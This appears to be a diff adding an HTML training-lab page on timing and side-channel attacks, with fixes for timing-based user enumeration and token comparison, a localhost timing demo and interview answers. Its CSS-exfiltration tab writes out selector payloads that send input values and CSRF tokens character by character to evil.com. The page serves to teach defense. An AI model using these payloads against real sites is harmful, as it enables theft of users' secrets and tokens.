@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Lab 04 — Timing & Side-Channel Attacks</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}body{background:#0f1117;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;padding:24px;line-height:1.6}h1{font-size:1.5rem;color:#ec4899;margin-bottom:4px}.sub{color:#94a3b8;font-size:.85rem;margin-bottom:20px}.tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}.tab{padding:7px 14px;border-radius:8px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem}.tab.active{background:#2a1a2a;border-color:#ec4899;color:#ec4899}.panel{display:none}.panel.active{display:block}.card{background:#1e2130;border:1px solid #2d3551;border-radius:12px;padding:20px;margin-bottom:14px}.card h3{color:#ec4899;margin-bottom:10px;font-size:.95rem}pre{background:#0f1117;border:1px solid #2d3551;border-radius:8px;padding:14px;overflow-x:auto;font-size:.78rem;line-height:1.7;white-space:pre-wrap}.kw{color:#60a5fa}.str{color:#10b981}.cm{color:#475569}.fn{color:#a78bfa}.danger{color:#ef4444}button{padding:8px 16px;border-radius:6px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem;margin:3px}button:hover{border-color:#ec4899;color:#ec4899}.output{background:#0d1117;border:1px solid #2d3551;border-radius:8px;padding:12px;font-family:monospace;font-size:.78rem;min-height:80px;max-height:400px;overflow:auto;white-space:pre-wrap;margin-top:8px}
+</style>
+</head>
+<body>
+<h1>🩷 Lab 04 — Timing & Side-Channel Attacks</h1>
+<p class="sub">Module 12.3 · Timing oracles, CSS exfiltration, pixel tracking</p>
+<div class="tabs">
+  <div class="tab active" onclick="setTab(0)">Timing Attacks</div>
+  <div class="tab" onclick="setTab(1)">CSS Exfiltration</div>
+  <div class="tab" onclick="setTab(2)">Timing Demo</div>
+  <div class="tab" onclick="setTab(3)">Interview Q&A</div>
+</div>
+
+<div class="panel active" id="p0">
+  <div class="card">
+    <h3>Timing Side-Channel Attacks</h3>
+    <pre><span class="cm">// Timing attack: Infer information from response time</span>
+
+<span class="cm">// ═══ Example 1: User enumeration ═══</span>
+<span class="cm">// Login with existing email: DB lookup + bcrypt = 200ms</span>
+<span class="cm">// Login with unknown email: early return = 5ms</span>
+<span class="cm">// Attacker measures: 200ms → email exists!</span>
+
+<span class="cm">// Fix: Constant-time comparison</span>
+<span class="kw">async function</span> <span class="fn">login</span>(email, password) {
+  <span class="kw">const</span> user = <span class="kw">await</span> db.findUser(email);
+  <span class="kw">if</span> (!user) {
+    <span class="cm">// Still do bcrypt compare to normalize timing</span>
+    <span class="kw">await</span> bcrypt.compare(password, <span class="str">'$2b$10$dummy_hash_here'</span>);
+    <span class="kw">return null</span>;
+  }
+  <span class="kw">const</span> valid = <span class="kw">await</span> bcrypt.compare(password, user.hash);
+  <span class="kw">return</span> valid ? user : <span class="kw">null</span>;
+}
+
+<span class="cm">// ═══ Example 2: Token comparison ═══</span>
+<span class="cm">// ❌ Unsafe: string === comparison is NOT constant time</span>
+<span class="kw">if</span> (token === storedToken) { ... }
+<span class="cm">// Fails faster if first chars differ → attacker brute-forces char by char</span>
+
+<span class="cm">// ✅ Safe: crypto.timingSafeEqual</span>
+<span class="kw">const</span> crypto = require(<span class="str">'crypto'</span>);
+<span class="kw">const</span> a = Buffer.from(token);
+<span class="kw">const</span> b = Buffer.from(storedToken);
+<span class="kw">if</span> (a.length === b.length &amp;&amp; crypto.timingSafeEqual(a, b)) { ... }</pre>
+  </div>
+</div>
+
+<div class="panel" id="p1">
+  <div class="card">
+    <h3>CSS-Based Data Exfiltration</h3>
+    <pre><span class="cm">// CSS can extract data without JavaScript!</span>
+<span class="cm">// Works even with strict CSP that blocks all scripts</span>
+
+<span class="cm">// ═══ Input value extraction ═══</span>
+<span class="cm">// If page has: &lt;input value="secret"&gt;</span>
+input[value^=<span class="str">"s"</span>] { background: url(<span class="danger">"//evil.com/?c=s"</span>); }
+input[value^=<span class="str">"se"</span>] { background: url(<span class="danger">"//evil.com/?c=se"</span>); }
+input[value^=<span class="str">"sec"</span>] { background: url(<span class="danger">"//evil.com/?c=sec"</span>); }
+<span class="cm">// Browser loads matching background → attacker's server logs it</span>
+<span class="cm">// Character by character extraction!</span>
+
+<span class="cm">// ═══ CSRF token extraction ═══</span>
+<span class="cm">// &lt;input type="hidden" name="csrf" value="abc123"&gt;</span>
+input[name=<span class="str">"csrf"</span>][value^=<span class="str">"a"</span>] { background: url(<span class="danger">"//evil.com/?a"</span>); }
+<span class="cm">// Extract CSRF tokens via CSS injection</span>
+
+<span class="cm">// ═══ Font-based extraction ═══</span>
+<span class="cm">// Custom font per character → load triggers reveal</span>
+
+<span class="cm">// Defense:</span>
+<span class="cm">// 1. CSP: style-src 'self' (no attacker stylesheets)</span>
+<span class="cm">// 2. Don't put sensitive data in HTML attributes</span>
+<span class="cm">// 3. Use HTTP headers for tokens, not hidden inputs</span></pre>
+  </div>
+</div>
+
+<div class="panel" id="p2">
+  <div class="card">
+    <h3>🧪 Timing Measurement</h3>
+    <button onclick="timingDemo()">⏱️ Measure Response Times</button>
+    <div class="output" id="timing-result">Click to measure timing differences</div>
+  </div>
+</div>
+
+<div class="panel" id="p3">
+  <div class="card">
+    <h3>Google Senior Frontend — Side Channels</h3>
+    <div style="font-size:.82rem">
+      <p><strong style="color:#60a5fa">Q: How do you defend against timing-based user enumeration?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">Layered defense: (1) Constant-time operations: Always perform the same work regardless of input. If user not found: still run bcrypt against a dummy hash. Same DB queries, same computation path. (2) Artificial delay: Add random delay (200-500ms) to all auth responses. Masks the true processing time. But: an attacker with enough samples can still differentiate (statistical analysis). (3) Rate limiting: Max 5 login attempts per IP per minute. Prevents the hundreds of attempts needed for timing analysis. (4) Generic responses: "Invalid credentials" for both wrong email and wrong password. Same HTTP status code. Same response structure. (5) At network level: Use CDN/WAF that normalizes response times. Some CDNs add buffering that masks server-side timing. (6) Monitoring: Detect enumeration patterns — sequential emails, high failure rate from single IP, alphabetical username attempts.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const tabs=document.querySelectorAll('.tab'),panels=document.querySelectorAll('.panel');
+function setTab(i){tabs.forEach((t,j)=>{t.classList.toggle('active',j===i);panels[j].classList.toggle('active',j===i)})}
+
+async function timingDemo(){
+  const el=document.getElementById('timing-result');
+  el.textContent='Timing Analysis Demo:\n'+('='.repeat(40))+'\n\n';
+  el.textContent+='Measuring response times for different endpoints...\n\n';
+  const endpoints=[
+    {url:'http://localhost:3001/api/auth/login',method:'POST',body:JSON.stringify({username:'alice',password:'Password123!'}),label:'Valid user, correct password'},
+    {url:'http://localhost:3001/api/auth/login',method:'POST',body:JSON.stringify({username:'alice',password:'wrongpassword'}),label:'Valid user, wrong password'},
+    {url:'http://localhost:3001/api/auth/login',method:'POST',body:JSON.stringify({username:'nonexistent_user_xyz',password:'anypassword'}),label:'Invalid user'},
+  ];
+  for(const ep of endpoints){
+    const times=[];
+    for(let i=0;i<3;i++){
+      const start=performance.now();
+      try{await fetch(ep.url,{method:ep.method,headers:{'Content-Type':'application/json'},body:ep.body})}catch(e){}
+      times.push(performance.now()-start);
+    }
+    const avg=(times.reduce((a,b)=>a+b)/times.length).toFixed(1);
+    el.textContent+=`${ep.label}:\n  Times: ${times.map(t=>t.toFixed(1)+'ms').join(', ')}\n  Average: ${avg}ms\n\n`;
+  }
+  el.textContent+='Analysis:\n';
+  el.textContent+='If "Invalid user" is significantly faster than "Valid user, wrong password",\n';
+  el.textContent+='the server is vulnerable to timing-based user enumeration.\n';
+  el.textContent+='Fix: Always run bcrypt.compare even for non-existent users.';
+}
+</script>
+</body></html>
